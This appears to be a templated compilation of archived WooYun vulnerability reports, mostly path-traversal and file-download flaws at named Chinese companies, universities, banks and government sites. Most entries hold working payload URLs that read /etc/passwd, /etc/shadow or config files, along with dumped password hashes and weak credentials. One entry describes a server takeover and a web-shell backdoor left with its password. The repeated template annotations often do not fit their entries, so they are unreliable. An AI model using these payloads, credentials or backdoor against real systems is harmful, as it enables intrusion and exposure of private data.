**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2013-033087] 拿下某酒品电商服务器巨量用户信息及订单信息泄露
**厂商**: huijiuwang.com | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能, 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站首页号称酒水团购第一网的徽酒网 http://www.huijiuwang.com/#----#目录遍历加数据库任意下载首先出问题的地方在：博客系统目录遍历，任意文件可下载，直接爆库http://www.huijiuwang.com/blog/很显然，此时上传大马已经不是问题了，而且显然找到了前人留下的马儿，破解占有之，扫端口，并寻找一些有价值的东西#----#惯用密码通用通过寻找诸如config等敏感文件，发现网站的管理者惯用的一个密码，再加上3389开着，连接之，果然不出所料，是同一密码，直接拿下服务器但是，我也发现了有很明显的前人已经造访的足迹#----#数据库管理软件保存密码服务器上有数据库管理的软件，并且是保存了密码的，直接就可以连接不多说，各种用户资料、各种订单资料、客服以及管理帐号只漏这么多了，信息量很大，为了防止这些已经造访的人恶意修改数据，我已经删了星号密码、将保存密

**POC**: 看服务器的情况，已经有人多次非法侵入了，请尽快联系厂商并及时解决问题，否则大量客户隐私遭到泄露时刻记住我们是白帽子就不会迷失方向。。。。为方便审核，留下后门http://www.huijiuwang.com/blog/ADMIN/h.aspx   密码：admin

**绕过**: 直接利用

**修复**: 1、防止遍历、数据库防下载2、不要惯用一个口令，否则一通具通3、一些重要的密码还是不要偷懒，最好不要保存
---

---
### [wooyun-2013-035617] 云端悦读官网任意文件下载漏洞
**厂商**: 边锋网络 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: app下载存在包含漏洞http://read.yunduan.cn/api/app/d?f=../../../../../../../../etc/passwd&v=2

**POC**: http://read.yunduan.cn/api/app/d?f=../../../../../../../../etc/passwd&v=2root:$1$jbm3eb40$c4f8Bcdf3VIhxsJy9oEgh/:15916:0:99999:7:::bin:*:15733:0:99999:7:::daemon:*:15733:0:99999:7:::adm:*:15733:0:99999:7:::lp:*:15733:0:99999:7:::sync:*:15733:0:99999:7:::shutdown:*:15733:0:99999:7:::halt:*:15733:0:99

**绕过**: 直接利用

**修复**: 过滤.
---

---
### [wooyun-2014-048390] 关于江西广播电视大学开放教育教务管理系统存在目录遍历和越权操作漏洞
**厂商**: 江西广播电视大学 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 江西省广播电势大学开放教育教务管理系统存在目录遍历和越权操作漏洞。经测试，漏洞情况属实。

**POC**: 验证URL：http://219.142.50.49/PRTVUWeb/pages/存在目录遍历。利用http://219.142.50.49/PRTVUWeb/pages/score/exemptscore/exemptscore.html能够查询学生的考试成绩和学生信息。通过点击“审批”，可修改学生的成绩，并进行保存。http://219.142.50.49/PRTVUWeb/queryExemptScoreLinkAction2.do?flag=1&itemSxh=0000000015253366011545acad070001

**绕过**: 直接利用

**修复**: 建议去除目录浏览。
---

---
### [wooyun-2014-065670] 华天动力OA任意文件读取
**厂商**: oa8000.com | **年份**: 2014 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 参数注入, 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 以官网http://demo.oa8000.com/为例，user:123456登陆后，向 http://demo.oa8000.com/OAapp/WebObjects/OAapp.woa/wa/TraceOpenPage POST如下参数：fileType=txt&jumpToPage=HtFile0141&initFromJsp=true&filePath=C%3A%2Fboot.ini&updateFlg=false将filePath更改为待读取文件的绝对路径即可。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 检查参数
---

---
### [wooyun-2016-0196034] 某语音网关系统任意文件读取漏洞
**厂商**: cncert | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 昆石网络技术有限公司VOS3000虚拟运营支撑系统任意文件读取漏洞众测时偶遇的。。直接上案例吧

**POC**: **.**.**.**/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwdhttp://**.**.**.**/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae

**绕过**: 直接利用

**修复**: -，-
---

---
### [wooyun-2015-0128723] 中国国旅核心业务站点任意文件读取
**厂商**: 中国国旅 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 谷歌查询https://g.wen.lu/search?newwindow=1&biw=1680&bih=903&noj=1&q=site%3Acits.com.cn++openFile.jsp&oq=site%3Acits.com.cn++openFile.jsp&gs_l=serp.3...6980.6980.0.7138.1.1.0.0.0.0.0.0..0.0.ckpsrh...0...1.1.64.serp..1.0.0.PD9P6TZlS0E

**POC**: http://b2b.cits.com.cn/citsonlineWeb/outbound/b2b/openFile.jsp?fileLink=./../../../../../etc/passwdhttp://ct1.cits.com.cn/citsonlineWeb/online/messageBBS/openFile.jsp?&fileName=/../../../../etc/passwd构造类似结构如：/etc/hosts/etc/httpd/conf/httpd.conf 等还有源码等root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2013-026459] 宁波大学使用某第三方CMS导致任意文件下载
**厂商**: 宁波大学 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://sbc.nbu.edu.cn/article/file/cid/4710/?file=../../../../application/config/config.ini.php&method=out

**POC**: http://sbc.nbu.edu.cn/article/file/cid/4710/?file=../../../../application/config/config.ini.php&method=out可下载：config.ini.php 文件内容[smarty]left_delimiter = "<{"right_delimiter = "}>"caching = 0[general]db.adapter = oracledb.config.host = localhostdb.config.username =speedcmsdb.config.password = speedc

**绕过**: 直接利用

**修复**: 过滤../../../../内容
---

---
### [wooyun-2015-0110832] 金山毒霸任意文件读取
**厂商**: 金山软件集团 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.duba.com/zt/questionnaire/index.php?c=index&a=index其实是duba.com整站的文件读取http://www.duba.com/nav.php?c=pic&a=download&file=Li4vaW5kZXgucGhwfile参数为base64加密的文件名可以遍历<?php$url= "http://www.duba.com/nav.php?c=pic&a=download&file=";$file = $argv[1];$url= $url.base64_encode($file);$con = file_get_contents($url);echo $con;?>

**POC**: 应该可以审计延伸

**绕过**: 直接利用

**修复**: 过滤获奖都送电视了能不能送我个电视
---

---
### [wooyun-2015-090956] 用友ICC客服系统任意文件下载漏洞影响联通人寿等
**厂商**: 用友软件 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 用友icc客户系统存在任意文件下载漏洞，漏洞文件common/getfile.jsp源码如下：<%@ page contentType="text/html;charset=UTF-8" %><%@ page import="java.io.*,com.ufida.icc.util.*,java.util.*" %><%String fullPath = "";String f="";f = request.getParameter("p");if(CommonUtil.validateParam(f)){f = "";}f = CommonUtil.filtParam(f);if(f == null || f.equals("")){out.print("请传入文件名。<br>");return;}f = f.substring(f.lastIndexOf("/")+1);String 

**POC**: 案例：http://111.75.198.122/web/icc/chat/chat?c=1&s=1http://111.75.198.122/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\shadow其他案例：中国联通在线导购客服http://help.10010.com/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\passwd中国联通客服http://webservice.10010.com/web/common/getfile.jsp?p=..\\..\\..\\..\\etc\\shadow人

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2016-0171593] 极享科技服务器配置不当造成目录遍历涉及三万代理商身份证信息
**厂商**: 极享科技 | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 认证接口

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看网上招聘，看到这个公司，随手扫了一下，http://cloud.jixiangkeji.com/data/可以目录遍历，http://cloud.jixiangkeji.com/datahttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/user/idcard/  下面是代理商认证照片 还找到一个发邮件程序，居然用的QQ邮箱http://cloud.jixiangkeji.com/data 文件遍历代理商手持证件照，还有一个发送邮件的PHP程序：包含一个QQ账号密码，可登陆。 网上看的估值十几亿，可以招点专业的技术。

**POC**: http://cloud.jixiangkeji.com/data 文件遍历代理商手持证件照，还有一个发送邮件的PHP程序：包含一个QQ账号密码，可登陆。

**绕过**: 直接利用

**修复**: 取消apache index配置，限制访问权限
---

---
### [wooyun-2014-057540] 中国人民共和国国土资源部备份文件下载
**厂商**: 中国人民共和国国土资源部 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 中国人民共和国国土资源部备份文件  http://www.mlr.gov.cn/mlr.zip 下载下来是trs文件 百度了下 说什么是数据库管理文件 彩笔不敢动

**POC**: 中国人民共和国国土资源部备份文件  http://www.mlr.gov.cn/mlr.zip

**绕过**: 直接利用

**修复**: 这么简单我就不用说了
---

---
### [wooyun-2016-0168673] 中国知网Nginx+MS15-034+RAR文件下载漏洞
**厂商**: 中国知网 | **年份**: 2016 | **类型**: 系统/服务补丁不及时

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务补丁不及时防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务补丁不及时相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 七处MS15-034 HTTP.sys 远程执行代码http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/http://**.**.**.**/两处Nginx解析漏洞http://**.**.**.**/js/jquery-1.4.2.min.js/%20\0.phphttp://**.**.**.**/js/jquery-1.4.2.min.js/a.php两处RAR下载http://**.**.**.**/jcydhd/jcydhd.rarhttp://**.**.**.**/default.rar

**POC**: 同上

**绕过**: 直接利用

**修复**: 打补丁。
---

---
### [wooyun-2013-028861] 华丰国际商贸城OA系统弱口令登录且目录遍历
**厂商**: 华丰国际商贸城 | **年份**: 2013 | **类型**: 后台弱口令

**元思考**: 触发信号: 认证接口

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 华丰国际商贸城OA系统http://www.ehuafeng.com/oa/default.asp弱口令：test test （角色是客服经理）还有一个是scb  scb （角色是市场部经理）这个scb是用test登录之后猜解到的还有一个管理员角色的用户名是：华丰商贸城   一直没有猜解出密码但是我想这种弱口令太美安全意识了，当我用市场经理的帐号在线给管理员留言时发现，其实那个华丰商贸城的帐户名应该是huafeng再次尝试 帐户密码均huafeng  huafeng   成功！人品爆了得到了管理帐号，一切操作随心所欲 操作合同、员工档案资料等等还有目录遍历问题：

**POC**: 如上

**绕过**: 直接利用

**修复**: 强化密码、避免目录遍历
---

---
### [wooyun-2013-039166] 联想某站配置不当导致遍历下载及登录绕过可后台管理
**厂商**: 联想 | **年份**: 2013 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题站点：http://124.127.255.45/lenovo/一、小智能机器人管理平台http://124.127.255.45/ZmptY2NtYW5hZ2Vy/直接可以管理了。二、目录遍历http://124.127.255.45/css里面有个svn:随便找一个可以打开：另一svn信息：http://124.127.255.45/images/.svn/text-base/工具包http://124.127.255.45/tools/http://124.127.255.45/lenovo/js/

**POC**: 不贴了，好多

**绕过**: 直接利用

**修复**: 增加后台限制，不能让任何人可登录；禁止目录浏览
---

---
### [wooyun-2015-0134132] 起凡游戏网用户日志信息泄漏
**厂商**: 5211game.com | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先是目录遍历：http://log.7fgame.com/

**POC**: 然后找到某个链接，可以查看到很多用户信息（玩家名称 SessionId 主机地址 ）：http://log.7fgame.com/List/Admin/GameLogListN.aspx 点击“搜索”：SessionId，是否可以直接登录游戏？没有测试。

**绕过**: 直接利用

**修复**: 修改默认配置
---

---
### [wooyun-2015-0157161] 人人网某分站存在任意文件下载漏洞
**厂商**: 人人网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 人人游戏http://live800.wan.renren.com//live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: http://live800.wan.renren.com//live800/downlog.jsp?path=/&fileName=/etc/hostshttp://live800.wan.renren.com//live800/downlog.jsp?path=/&fileName=/etc/shadow

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2015-0109579] 武汉大学某院存在任意文件下载漏洞
**厂商**: 武汉大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 武汉大学某院存在任意文加下载   可下载源码利用

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-066851] 恒安集团任意文件读取
**厂商**: 恒安集团 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.hengan.com/dl_pdf.php?u=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd直接下载下来

**POC**: http://www.hengan.com/dl_pdf.php?u=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd直接下载下来

**绕过**: 直接利用

**修复**: 你懂得
---

---
### [wooyun-2014-051509] 快的打车Nexus配置不当导致敏感信息泄露
**厂商**: 快的打车 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址：http://122.13.177.250:8081/index.html右上角 log inadmin/admin123从图中可以看到支付宝，和快的打车的文件夹文件夹中的文件都可以直接下载

**POC**: (见原文)

**绕过**: 直接利用

**修复**: #修改管理员密码#IP访问限制
---

---
### [wooyun-2016-0167668] 北京大学某系统存在任意文件下载
**厂商**: 北京大学 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: mis.ss.pku.edu.cn/news/download.jsp?fileName=../../../../../../../../../../../etc/shadow

**POC**: root:$1$i8pE4zLB$gS.RNG9g.KsTpPfy3UJd//:15191:0:99999:7:::bin:*:15155:0:99999:7:::daemon:*:15155:0:99999:7:::adm:*:15155:0:99999:7:::lp:*:15155:0:99999:7:::sync:*:15155:0:99999:7:::shutdown:*:15155:0:99999:7:::halt:*:15155:0:99999:7:::mail:*:15155:0:99999:7:::news:*:15155:0:99999:7:::uucp:*:15155:0:

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2016-0171134] 长安汽车某系统任意文件下载
**厂商**: 长安马自达汽车有限公司 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: live800在线客服urlhttp://cazx.changan.com.cn/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: 已证明

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2014-060835] 启明天镜漏洞扫描器任意文件下载漏洞
**厂商**: 北京启明星辰信息安全技术有限公司 | **年份**: 2014 | **类型**: 设计不当

**元思考**: 触发信号: 功能测试

**洞察**: 设计不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 记不清几年前了用过一次启明星辰的天镜扫描器，那会只是个软件，现在居然也做成了铁盒子用上了B/S架构（国内都喜欢玩盒子，其实厂家是希望我们做安全的没事多搬搬设备锻炼个好身体，不过我比较懒还是觉得nessus软件形式的用起来方便）大概看了一下产品做得还是比较粗糙的，不知道是不是走的俄罗斯粗犷但实用路线。发现一处任意文件下载问题，我本来只想用用没想找漏洞，但是太明显了，扫一眼就看到了。

**POC**: https://x.x.o.o/download/export.action?downloadForm.toolPosition=/WEB-INF/classes/jdbc.properties

**绕过**: 直接利用

**修复**: 都知道就不再啰嗦了。
---

---
### [wooyun-2015-0163239] 浦发银行某系统windows任意文件下载一枚
**厂商**: 浦发银行 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 注意不一样的页面http://**.**.**.**//Chart/GoldChart.aspx?ChartDirectorChartImage=chart_fxChart&cacheId=c:\windows\win.ini&cacheDefeat=635863155579382345; for 16-bit app support[fonts][extensions][mci extensions][files][Mail]MAPI=1[MCI Extensions.BAK]aif=MPEGVideoaifc=MPEGVideoaiff=MPEGVideoasf=MPEGVideoasx=MPEGVideoau=MPEGVideom1v=MPEGVideom3u=MPEGVideomp2=MPEGVideomp2v=MPEGVideomp3=MPEGVideompa=MPEGVideo

**POC**: C:\Windows\System32\drivers\etc\hostshttp://**.**.**.**//Chart/GoldChart.aspx?ChartDirectorChartImage=chart_fxChart&cacheId=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts&cacheDefeat=635863155579382345

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2013-036603] 海尔某站备份信息与敏感信息泄露
**厂商**: 海尔集团 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题系统：青岛海尔生物医疗设备本部终端执行力系统这个终端竟然存在1.5G的web.rar文件下载。。。。。http://123.234.41.43/web.rar

**POC**: 这个东西，我不想继续分析了，，，，9月份的，，，，，我想应该是最新的吧？？

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-072693] 浙大万鹏某通用教育类门户系统存在任意文件下载漏洞
**厂商**: 浙大万鹏 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 浙大万鹏某通用教育类门户系统存在任意文件下载漏洞，可下载敏感配置文件，导致服务器敏感信息泄漏，见证明

**POC**: 谷歌关键字：inurl:cnet/dynamic/presentation/intitle:ZDSOFT.NET信息发布平台-2001-2005 浙江大学网络信息系统有限公司 版权所有搜索发现存在大量站点使用此web系统此系统版权为浙大万鹏（http://www.zdsoft.net/）漏洞存在位置：http://www.ymedu.gov.cn/cnet/dynamic/presentation/net_1/downloaddelegate.down?domesticfile=任意文件例子：http://www.ymedu.gov.cn/cnet/dynamic/presentation/n

**绕过**: 直接利用

**修复**: 无
---

---
### [wooyun-2013-020366] 多个省级政府站点任意文件下载
**厂商**: 多个省级政府站点 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 江苏人力资源和社会保障网http://www.js.lss.gov.cn/Auditing/download.jsp?filename=../../Auditing/download.jsp福建水利信息网http://www.fjwater.gov.cn/admin/download.jsp?path=/admin/download.jsp吉林省质量技术监督局http://www.jlqi.gov.cn/util/downFile.jsp?fileName=../util/downFile.jsp安徽价格鉴证网http://www.ahpi.gov.cn:8080/jsp/download.jsp?filename=../../../jsp/download.jsp山西省人口和计划生育委员会http://www.sxrk.gov.cn/download.jsp?downadd=../../

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2015-0157674] 金蝶某分站存在任意文件下载（敏感信息泄露）
**厂商**: 金蝶 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://wooyun.org/bugs/wooyun-2015-0147511为什么要忽略呢！online.kingdee.com/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0152838] 浙江某大学旗下站点编辑器弱口令+目录遍历+敏感信息泄漏
**厂商**: zjut.edu.cn | **年份**: 2015 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 各种敏感信息泄漏 编辑器弱口令 遍历目录。。。

**POC**: 目标站点:http://www.software.zjut.edu.cn/编辑器弱口令:http://www.software.zjut.edu.cn/admin/editor/admin/login.php帐号密码为adminapache 可遍历目录http://www.software.zjut.edu.cn/admin/editor/等路径敏感信息:http://www.software.zjut.edu.cn/gzd.sqlLOCK TABLES `ins_admin` WRITE;/*!40000 ALTER TABLE `ins_admin` DISABLE KEYS */;INS

**绕过**: 直接利用

**修复**: rank能多点？
---

---
### [wooyun-2012-012911] 珍品网某分站任意文件读取
**厂商**: 珍品网 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://brand.zhenpin.com/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2013-033936] 维普网两处任意文件下载漏洞可得到数据库密码
**厂商**: cqvip.com | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 多的不说了，上地址http://www.cqvip.com/Common/LoadPageBase.aspx?path=/web.confighttp://ipub.cqvip.com/Common/LoadPageBase.aspx?path=LoadPageBase.aspxpath参数以/开头就是页面根目录，不能跳到顶级目录外，不过也够危险的

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 判断下扩展名吧
---

---
### [wooyun-2015-0112275] MSA互联网管理网关任意文件遍历下载（无需登录）
**厂商**: 上海宝创信息科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 由于没充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。无需登录情况任意遍历系统文件下载（以/etc/passwd文件为例）案例：https://61.177.62.254/https://211.70.1.45/https://222.139.212.52/https://222.92.137.74/https://59.61.234.109/https://122.227.166.27/https://123.13.224.247/https://222.85.76.112/https://221.176.165.214/https://122.227.166.26/https://117.32.249.196/https://61.175.134.133/https://218.26.10.175/https://szico.com/

**POC**: https://url/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../etc/passwd

**绕过**: 直接利用

**修复**: 联系厂商
---

---
### [wooyun-2013-019431] 海马汽车主站配置问题引起服务器沦陷
**厂商**: 海马汽车 | **年份**: 2013 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 关闭目录遍历和限制上传类型
---

---
### [wooyun-2015-0162248] 暨南大学某分站任意文件下载导致敏感信息泄漏
**厂商**: 暨南大学 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: URI:http://sky.jnu.edu.cn/ftp.php?filename=下载index.php:http://sky.jnu.edu.cn/ftp.php?filename=index.php查看信息：下载banner.php:http://sky.jnu.edu.cn/ftp.php?filename=banner.php查看信息：下载link.php:http://sky.jnu.edu.cn/ftp.php?filename=link.php查看信息：下载config.php,得到数据库的帐号密码：

**POC**: (见原文)

**绕过**: 直接利用

**修复**: RT
---

---
### [wooyun-2016-0187893] P2P金融安全宁波银行某系统任意文件下载并可以下载个人简历
**厂商**: 宁波银行股份有限公司 | **年份**: 2016 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 参数注入

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 宁波银行招聘网站网站：http://zhaopin.nbcb.cn/recruit/com.nbcb.recruit.auth.index.flow注册一个账号进入以后，发现简历可以导出连接为：http://zhaopin.nbcb.cn/recruit/rckgl/download.jsp?zipFile=/recruit/resume/schoolResume//20160322012458.zip可以看到，最后的20160322012458.zip是根据时间生成的，所以只需要遍历这个值，就可以下载别人的简历了，比如我这里只遍历今天的简历发现了几个简历。2.此处zipFile参数没过滤，可以直接输入绝对路径，下载任意文件，最搞笑的是，WAF阻断了/etc/passwd，但是不阻断/etc/shadow链接：http://zhaopin.nbcb.cn/recruit/rckgl/dow

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 控制权限。防止别人下载。
---

---
### [wooyun-2014-051368] 中国人保寿险主站任意文件下载漏洞
**厂商**: 中国人民人寿保险股份有限公司 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

